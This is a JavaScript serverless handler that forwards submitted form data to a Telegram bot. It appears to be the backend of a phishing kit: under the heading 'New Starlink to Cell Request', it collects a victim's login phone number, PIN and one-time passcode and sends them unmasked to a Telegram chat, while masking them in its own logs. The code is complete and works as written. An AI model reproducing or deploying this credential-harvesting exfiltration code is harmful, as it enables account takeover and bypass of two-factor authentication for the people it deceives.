// api/sendTelegram.js
// HTML-safe Telegram sender — FIXED HEADING (ALWAYS INSTANT)

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    const missing = [];
    if (!TELEGRAM_TOKEN) missing.push('TELEGRAM_TOKEN');
    if (!TELEGRAM_CHAT_ID) missing.push('TELEGRAM_CHAT_ID');
    console.error('Missing env vars:', missing.join(', '));
    return res.status(500).send('Missing env vars: ' + missing.join(', '));
  }

  /* ========= PARSE JSON ========= */
  let payload = {};
  try {
    payload =
      typeof req.body === 'string'
        ? JSON.parse(req.body || '{}')
        : (req.body || {});
  } catch (err) {
    console.error('Invalid JSON:', err?.message);
    return res.status(400).send('Invalid JSON');
  }

  /* ========= HELPERS ========= */
  function escHTML(s) {
    if (s === null || s === undefined) return '';
    return String(s)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function short(s, n = 800) {
    if (s === null || s === undefined) return '';
    s = String(s);
    return s.length > n
      ? escHTML(s.slice(0, n)) + '…(truncated)'
      : escHTML(s);
  }

  function mask(s) {
    if (!s) return s;
    const ss = String(s);
    if (ss.length <= 2) return '*'.repeat(ss.length);
    return '*'.repeat(ss.length - 2) + ss.slice(-2);
  }

  /* ========= LOG MASKED ========= */
  const logged = { ...payload };
  if (logged.loginPin) logged.loginPin = mask(logged.loginPin);
  if (logged.otp) logged.otp = mask(logged.otp);
  console.log('sendTelegram payload (masked):', JSON.stringify(logged));

  /* ========= FIXED HEADING ========= */
  const heading = 'New Starlink to Cell Request';

  /* ========= BUILD MESSAGE ========= */
  let text = `<b>${heading}</b>\n\n`;

  if (payload.submittedAt) {
    text += `<b>Time:</b> ${escHTML(payload.submittedAt)}\n\n`;
  }

  if (payload.loginPhone) {
    text += '<b>Login details:</b>\n';
    text += `<b>Phone:</b> ${escHTML(payload.loginPhone)}\n`;
    if (payload.loginPin) {
      text += `<b>PIN:</b> ${escHTML(payload.loginPin)}\n`;
    }
    if (payload.otp) {
      text += `<b>OTP:</b> ${escHTML(payload.otp)}\n`;
    }
    text += '\n';
  }

  /* ========= OTHER DATA ========= */
  const extras = { ...payload };
  delete extras.submittedAt;
  delete extras.loginPhone;
  delete extras.loginPin;
  delete extras.otp;

  if (Object.keys(extras).length) {
    text += '<b>Other:</b>\n';
    for (const k of Object.keys(extras)) {
      text += `<b>${escHTML(k)}:</b> ${short(extras[k])}\n`;
    }
  }

  /* ========= SEND TO TELEGRAM (INSTANT) ========= */
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const bodyText = await resp.text();
    console.log('Telegram API status:', resp.status, bodyText);

    if (!resp.ok) {
      return res.status(502).send('Telegram error: ' + bodyText);
    }

    try {
      return res.status(200).json(JSON.parse(bodyText));
    } catch {
      return res.status(200).send(bodyText);
    }
  } catch (e) {
    console.error('Telegram fetch error:', e?.message);
    return res.status(500).send('Fetch error: ' + e?.message);
  }
}
